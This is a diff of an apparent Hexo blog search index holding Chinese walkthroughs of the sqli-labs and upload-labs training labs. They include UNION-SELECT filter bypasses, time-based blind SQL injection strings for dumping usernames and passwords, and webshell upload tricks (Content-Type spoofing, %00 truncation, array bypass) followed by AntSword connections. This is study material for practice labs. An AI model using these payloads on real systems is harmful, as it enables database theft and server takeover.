-  <entry>
-    <title>sqli-labs_28</title>
-    <url>/2022/11/17/sqli-labs_28+28a/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过该绕过的，注入照常注入</p>
-<span id="more"></span>
-
-<h1 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h1><ol>
-<li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);				<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);					<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);	   		 	//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    		<span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);	    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li>
-</ol>
-<h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2">
-<li><p>猜解SQL查询语句中的字段数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>爆出显示位</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=&#x27;users&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;)%0buniOn%0bsElEct%0b1,(group_concat(username,0x7e,password)),3%0bfrom%0busers%0bwhere%0b(&#x27;1&#x27;)=(&#x27;1</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第28a关"><a href="#第28a关" class="headerlink" title="第28a关"></a>第28a关</h2><p>与28关相比，只是过滤条件少了几个</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>构造语句的原理还不甚明白，有些人写的博客能过，有些不能过。<br>总的来说，用%00是比较通用简单的方式</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/weixin_39934520/article/details/105801767">Sqli-labs之Less-28和Less-28a</a><br><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -3556,6 +3556,45 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
       </tags>
   </entry>
   <entry>
+    <title>sqli-labs_48-53</title>
+    <url>/2022/11/19/sqli-labs_48-53/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试并判断注入类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
+<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
+</li>
+<li><p>获取当前数据库名和数据库版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p>
+<h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
+<h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p>
+<h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p>
+<h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>sqli-labs_5+6</title>
     <url>/2022/11/08/sqli-labs_5+6/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第5，6关基本一致，区别只在于单引号和双引号，因此放在一起了。这两关的关键点在于：正确时不返回结果，错误时有报错信息。因此综合判断之下，使用报错注入的方式最好。</p>
@@ -3591,45 +3630,6 @@ mysqli_multi_query()函数作用是：执行一个SQL语句，或者多个使用
 <li><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a></p>
 </li>
 </ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>sqli-labs</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>sqli-labs</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs_48-53</title>
-    <url>/2022/11/19/sqli-labs_48-53/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>久违的盲注</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试并判断注入类型</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;   无信息，只知道出错</span><br></pre></td></tr></table></figure>
-<p>可以发现，现在无法使用报错注入了<br>那我们就要用到久违的盲注了。</p>
-</li>
-<li><p>获取当前数据库名和数据库版本号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if((ascii(substr(database(),1,1))=115),sleep(10),1) --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆表</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆字段名</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substring((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database()) limit 0,1),1,1))=101,sleep(10),1);--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>爆数据</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?sort=-1 and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1);--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关"></a>第49关</h2><p>与第48关相比差不多，只是闭合方式为’</p>
-<h2 id="第50关"><a href="#第50关" class="headerlink" title="第50关"></a>第50关</h2><p>与第48关相比差不多，因为源码中存在mysqli_multi_query,可以堆叠注入</p>
-<h2 id="第51关"><a href="#第51关" class="headerlink" title="第51关"></a>第51关</h2><p>与第50关相比差不多，只是闭合方式为’</p>
-<h2 id="第52关"><a href="#第52关" class="headerlink" title="第52关"></a>第52关</h2><p>与第50关相比差不多</p>
-<h2 id="第53关"><a href="#第53关" class="headerlink" title="第53关"></a>第53关</h2><p>与第51关相比差不多</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>常规操作</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Yb_140/article/details/123223306">sql-labs(1-65)</a><br><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024">sqli-labs大详解（完结）</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -4008,6 +4008,29 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
+    <title>upload-labs_2</title>
+    <url>/2022/11/24/upload-labs_2/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
+</li>
+<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
+]]></content>
+      <categories>
+        <category>upload-labs</category>
+      </categories>
+      <tags>
+        <tag>upload-labs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>upload-labs_18+19</title>
     <url>/2022/11/27/upload-labs_18+19/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p>
@@ -4032,29 +4055,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       </tags>
   </entry>
   <entry>
-    <title>upload-labs_2</title>
-    <url>/2022/11/24/upload-labs_2/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关难度也不大，只是涉及到了新的知识点。</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
-<li><p>测试<br>首先可以尝试传输文件。<br>当我传输一个txt文件时，提示类型错误，但这次和第一关不同，不是弹窗，而是页面直接提示，因此不是前端JavaScript验证。<br>这时我们查看源码，可以看到下面这一段：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]            </span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
-<p>从这段代码可以看出，上传文件的途中验证了content-type，并且固定了上传文件类型。这里涉及到了MIME。<br>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>浏览器通常使用 MIME 类型（而不是文件扩展名）来确定如何处理URL，因此 We b服务器在响应头中添加正确的 MIME 类型非常重要。如果配置不正确，浏览器可能会无法解析文件内容，网站将无法正常工作，并且下载的文件也会被错误处理。<br>语法：<br>type&#x2F;subtype<br>用法：<br>客户端：<br>告诉服务端上传文件类型<br>告诉服务端可以接受文件类型<br>服务端：<br>告诉客户端响应数据类型<br>详细参见：<a href="https://www.runoob.com/http/mime-types.html">MIME 类型</a><br>因此可以通过改变content-type来让目标文件上传成功</p>
-</li>
-<li><p>尝试与抓包<br>burp抓包，将content-type更改为image&#x2F;png，然后放包，我们就看到文件上传成功了。<br>然后打开，显示没问题，最终成功！</p>
-</li>
-</ol>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>总的来说，没什么难度。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
-]]></content>
-      <categories>
-        <category>upload-labs</category>
-      </categories>
-      <tags>
-        <tag>upload-labs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>upload-labs_20</title>
     <url>/2022/11/27/upload-labs_20/</url>
     <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关要轻松一些了</p>
@@ -4062,24 +4062,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h2><p>截断move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断(注意php版本低于5.3)<br>具体实现是，上传文件为图片马，将保存文件的名称后缀修改为.php 注意最后有一个空格<br>然后抓包，在Hex里修改空格20为00<br>可以看到上传成功，蚁剑连接也成功</p>
 <h2 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h2><p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以可以抓包，然后在保存文件末尾用&#x2F;.<br>这样我们可以看到，文件同样上传成功，蚁剑也连接成功</p>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一关的方法要简单一些了，但只是学会了方法，背后的原理仍需掌握。</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
-]]></content>
-      <categories>
-        <category>upload-labs</category>
-      </categories>
-      <tags>
-        <tag>upload-labs</tag>
-        <tag>蚁剑</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>upload-labs_21</title>
-    <url>/2022/11/27/upload-labs_21/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p>
-<span id="more"></span>
-<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p>
-<p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
 ]]></content>
       <categories>
@@ -4110,6 +4092,24 @@ secure_file_priv 一栏的value为空，即是成功</li>
 </ol>
 <h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>今天在这一关弄了好久，起因却是一个有点儿离谱的原因。网页能打开，蚁剑却连不上。最后才发现，变量名就是密码，我第一关阴差阳错地对了。但我不知道密码要设为变量名，这一关也是随便一个密码，却一直过不了。最终发现是蚁剑的密码和文件内的变量名不同，谨记。<br>下次尽量避开这种失误。</p>
 <h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/m0_62879498/article/details/123021865">文件上传漏洞——upload-labs 1-19</a><br><a href="https://blog.csdn.net/K_ShenH/article/details/122438998">upload-labs安装及攻略</a></p>
+]]></content>
+      <categories>
+        <category>upload-labs</category>
+      </categories>
+      <tags>
+        <tag>upload-labs</tag>
+        <tag>蚁剑</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>upload-labs_21</title>
+    <url>/2022/11/27/upload-labs_21/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p>
+<span id="more"></span>
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p>
+<p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>
 ]]></content>
       <categories>
         <category>upload-labs</category>
@@ -4357,7 +4357,7 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <h2 id="第35题"><a href="#第35题" class="headerlink" title="第35题"></a>第35题</h2><p><code>system()</code> 执行系统命令，输出执行结果<br><code>exec()</code> 执行系统命令，不输出结果，返回执行结果数组<br><code>passthru()</code> 执行系统命令，输出执行结果（支持二进制）<br><code>shell_exec()</code> 执行系统命令，不输出结果，返回执行结果字符串<br><code>popen()</code> 执行系统命令，不输出结果，返回一个资源类型<br>反引号（`）执行系统命令，不输出结果，返回执行结果字符串</p>
 <h2 id="第36题"><a href="#第36题" class="headerlink" title="第36题"></a>第36题</h2><p>非对称加密与对称加密不一样的地方在于，非对称加密算法有两个密钥，分别为公钥和私钥，它的安全性比对称加密更好，公钥用来加密，私钥用来解密。</p>
 <h2 id="第37题"><a href="#第37题" class="headerlink" title="第37题"></a>第37题</h2><p>文件上传漏洞大多出现在可以进行文件上传的地方，如用户头像上传，文档上传处等。</p>
-<h2 id="第38题"><a href="#第38题" class="headerlink" title="第38题"></a>第38题</h2><p>eval（）和assert（）函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致</p>
+<h2 id="第38题"><a href="#第38题" class="headerlink" title="第38题"></a>第38题</h2><p>eval()和assert()函数导致的代码执行漏洞大多是因为载入缓存或者模板以及对变量的处理不严格导致</p>
 <h2 id="第39题"><a href="#第39题" class="headerlink" title="第39题"></a>第39题</h2><h3 id="escapeshellcmd-函数"><a href="#escapeshellcmd-函数" class="headerlink" title="escapeshellcmd()函数"></a>escapeshellcmd()函数</h3><p>shell元字符转义</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">escapeshellcmd</span>(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure>
 <p>escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。escapeshellcmd() 应被用在完整的命令字符串上。escapeshellcmd() 不会对空格转义。</p>
@@ -4415,16 +4415,21 @@ secure_file_priv 一栏的value为空，即是成功</li>
 <h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p>open_basedir加载外部脚本时，多个目录以冒号(:)分割</p>
 <h3 id="display-errors"><a href="#display-errors" class="headerlink" title="display_errors"></a>display_errors</h3><p>配置error_reporting时，需要开启display_errors&#x3D;on</p>
 <h2 id="第3题-2"><a href="#第3题-2" class="headerlink" title="第3题"></a>第3题</h2><p>浏览器扩展工具：Hackbar, Firebug, Modify</p>
-<h2 id="第4题-2"><a href="#第4题-2" class="headerlink" title="第4题"></a>第4题</h2><h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><p>作用是变量覆盖</p>
+<h2 id="第5题-3"><a href="#第5题-3" class="headerlink" title="第5题"></a>第5题</h2><h3 id="parse-str-函数"><a href="#parse-str-函数" class="headerlink" title="parse_str()函数"></a>parse_str()函数</h3><p>作用是变量覆盖</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span> ( <span class="keyword">string</span> <span class="variable">$encoded_string</span> [, <span class="keyword">array</span> &amp;<span class="variable">$result</span> ] ) : <span class="keyword">void</span></span><br></pre></td></tr></table></figure>
 <p>如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。如果传入的字符串的键名是数组里没有的变量则会创建一个新的变量并赋值给它。如果是已有的变量但值不同，则字符串的键值会覆盖原来的值。</p>
-<h2 id="第5题-3"><a href="#第5题-3" class="headerlink" title="第5题"></a>第5题</h2><p>抽奖和投票漏洞有以下几种利用方法：</p>
+<h2 id="第6题-2"><a href="#第6题-2" class="headerlink" title="第6题"></a>第6题</h2><p>抽奖和投票漏洞有以下几种利用方法：</p>
 <ol>
 <li>cookie或POST请求正文绕过</li>
 <li>基于IP验证</li>
 <li>基于用户认证</li>
 </ol>
-<h2 id="第6题-2"><a href="#第6题-2" class="headerlink" title="第6题"></a>第6题</h2>]]></content>
+<h2 id="第7题-3"><a href="#第7题-3" class="headerlink" title="第7题"></a>第7题</h2><p>文件包含漏洞大多出现在模块加载，模板加载和cache调用的地方</p>
